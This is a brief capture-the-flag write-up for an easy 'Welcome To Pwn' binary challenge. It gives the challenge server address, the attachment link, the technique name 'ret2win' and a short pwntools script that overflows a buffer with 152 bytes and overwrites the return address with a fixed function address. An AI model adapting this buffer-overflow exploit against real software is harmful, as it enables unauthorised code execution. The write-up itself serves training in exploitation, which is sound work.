## Welcome To Pwn (457pt)				

### Description

> Welcome to pwn, here is an easy challenge to get you started. 
>
> nc 35.238.225.156 1001 
>
> Author: Viper_S


### Attachment

[welcome](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/welcome/welcome)

### Analysis

ret2win

### Solution

```python
offset = 152
payload = 'A'*offset
payload += p64(0x00401186)
sl(payload)
p.interactive()
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/boot2root/pwn/welcome) 


